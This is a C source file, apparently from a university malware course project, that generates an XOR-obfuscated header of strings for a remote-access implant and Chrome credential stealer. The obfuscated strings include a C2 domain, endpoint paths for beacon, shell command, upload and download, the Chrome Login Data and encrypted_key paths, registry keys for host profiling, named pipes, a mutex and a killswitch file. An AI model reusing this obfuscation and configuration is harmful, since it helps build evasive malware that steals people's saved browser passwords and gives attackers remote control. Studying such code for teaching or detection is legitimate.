// https://openpunk.com/pages/obfuscation-in-c/

#define LAIKA_PUBKEY "cs6983malware"
#define LAIKA_VM_CODESIZE 512

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define ERR(...)                                                               \
  do {                                                                         \
    printf(__VA_ARGS__);                                                       \
    exit(EXIT_FAILURE);                                                        \
  } while (0);
#define RANDBYTE (rand() % UINT8_MAX)

static const char *PREAMBLE =
    "/* file generated by VMBoxGen, see tools/vmboxgen/src/main.c */\n"
    "#ifndef LAIKA_VMBOX_CONFIG_H\n"
    "#define LAIKA_VMBOX_CONFIG_H\n\n";
static const char *POSTAMBLE = "\n#endif\n";

static void writeArray(FILE *out, uint8_t *data, int sz) {
  int i;

  fprintf(out, "{");
  for (i = 0; i < sz - 1; i++) {
    fprintf(out, "0x%02x, ", data[i]);
  }
  fprintf(out, "0x%02x};\n", data[sz - 1]);
}

static void writeDefineArray(FILE *out, char *ident, uint8_t *data) {
  fprintf(out, "#define %s ", ident);
  writeArray(out, data, LAIKA_VM_CODESIZE);
}

static void writeDefineVal(FILE *out, char *ident, int data) {
  fprintf(out, "#define %s 0x%02x\n", ident, data);
}

static void addPadding(uint8_t *data, int start) {
  int i;

  /* if the box is less than LAIKA_VM_CODESIZE, add semi-random padding */
  for (i = start; i < LAIKA_VM_CODESIZE; i++) {
    data[i] = RANDBYTE;
  }
}

static void makeSKIDdata(char *data, int sz, uint8_t *buff, int key) {
  int i;

  for (i = 0; i < sz; i++)
    buff[i] = data[i] ^ key;

  buff[i++] = key;     /* add the null terminator (key ^ key = 0x00) */
  addPadding(buff, i); /* fill in the remaining bytes with semi-rand padding */
}

#define MAKESKIDDATA(macro)                                                    \
  key = RANDBYTE;                                                              \
  makeSKIDdata(macro, strlen(macro), tmpBuff, key);                            \
  writeDefineVal(out, "KEY_" #macro, key);                                     \
  writeDefineArray(out, "DATA_" #macro, tmpBuff);

int main(int argv, char **argc) {
  uint8_t tmpBuff[LAIKA_VM_CODESIZE];
  FILE *out;
  char *fileName;
  int key;

  if (argv < 2)
    ERR("USAGE: %s [OUTFILE]\n", argv > 0 ? argc[0] : "BoxGen");

  /* open output file */
  fileName = argc[1];
  if ((out = fopen(fileName, "w+")) == NULL)
    ERR("Failed to open %s!\n", fileName);

  srand(time(NULL)); /* really doesn't need to be cryptographically secure, the
                        point is only to slow them down */

  fputs(PREAMBLE, out);
  MAKESKIDDATA(LAIKA_PUBKEY);
#define MAKE_SKID(macro, str)                                                  \
  key = RANDBYTE;                                                              \
  makeSKIDdata(str, strlen(str), tmpBuff, key);                                \
  writeDefineVal(out, "KEY_" #macro, key);                                     \
  writeDefineArray(out, "DATA_" #macro, tmpBuff);

  MAKE_SKID(beaconh_SERVER_PK_B64, "H9luw7Iil2BrayAS9Pu2yrvirN/fdZ9oqPFyk99lYQ8=")
  MAKE_SKID(interneth_SERVER_ADDR_PROD, "pastebin-api.com")
  MAKE_SKID(interneth_SERVER_ADDR_TEST, "127.0.0.1")
  MAKE_SKID(interneth_PATH_BEACON, "/570d3879356/")
  MAKE_SKID(interneth_PATH_INFOGATHER, "/93c6f53e7c1/")
  MAKE_SKID(interneth_PATH_REGISTER, "/3cde155e69/")
  MAKE_SKID(interneth_PATH_SHELLCMD, "/284686a8870/")
  MAKE_SKID(interneth_PATH_UPLOAD, "/cb733125db26/")
  MAKE_SKID(interneth_PATH_DOWNLOAD, "/4006384724e/")
  MAKE_SKID(interneth_PATH_CHROME, "/db2686e4eb/")
  MAKE_SKID(interneth_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")

  MAKE_SKID(internet_connectServer_POST, "POST")
  
  MAKE_SKID(chromstealer_getChromeLocalStatePath_users,"C:\\Users\\")
  MAKE_SKID(chromstealer_getChromeLocalStatePath_localstate,"\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
  MAKE_SKID(chromstealer_getChromeLocalLoginPath_users,"C:\\Users\\")
  MAKE_SKID(chromstealer_getChromeLocalLoginPath_logindata,"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
  MAKE_SKID(chromstealer_readEncryptedKey_searchStr,"encrypted_key")

  MAKE_SKID(fileIO_readChunks_Makefile,"Makefile")

  MAKE_SKID(exec_parseDownloadArg_divider, "|")
  MAKE_SKID(exec_callCalc, "C:\\Windows\\System32\\calc.exe")
  MAKE_SKID(exec_displaymessageboxthread, "Message Box Title")
  MAKE_SKID(exec_infogather_central_processor_key, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
  MAKE_SKID(exec_infogather_central_processor_str, "ProcessorNameString")
  MAKE_SKID(exec_infogather_guid_key, "SOFTWARE\\Microsoft\\Cryptography")
  MAKE_SKID(exec_infogather_guid_str, "MachineGuid")
  MAKE_SKID(exec_infogather_version_key, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
  MAKE_SKID(exec_infogather_version_str, "ProductName")

  // MAKE_SKID(maindll_clientMode_pipe, "\\\\%s\\pipe\\mynamedpipe")  
  MAKE_SKID(maindll_clientMode_pipeslash, "\\\\")  
  MAKE_SKID(maindll_clientMode_pipeslash2, "\\pipe\\mynamedpipe")  
  MAKE_SKID(pipeserverclient_pipeserver_lpszpipename, "\\\\.\\pipe\\mynamedpipe")  
  MAKE_SKID(pipeserverclient_pipeServerListen_CS6983, "CS6983")  
  MAKE_SKID(pipeserverclient_getPipeHostName_255, "255.255.255.255")  
  MAKE_SKID(pipeserverclient_dummyConnectPipe_callnamedpipeA, "\\\\.\\pipe\\mynamedpipe")  

  MAKE_SKID(main_dll_killswitchfile, "C:\\malware\\ch0nky.txt")  
  MAKE_SKID(main_dll_mutexName, "Global_section1")  

  fputs(POSTAMBLE, out);
  fclose(out);

  printf("Laika VMBox data header dumped to '%s'\n", fileName);
  return 0;
}

#undef MAKESKIDDATA
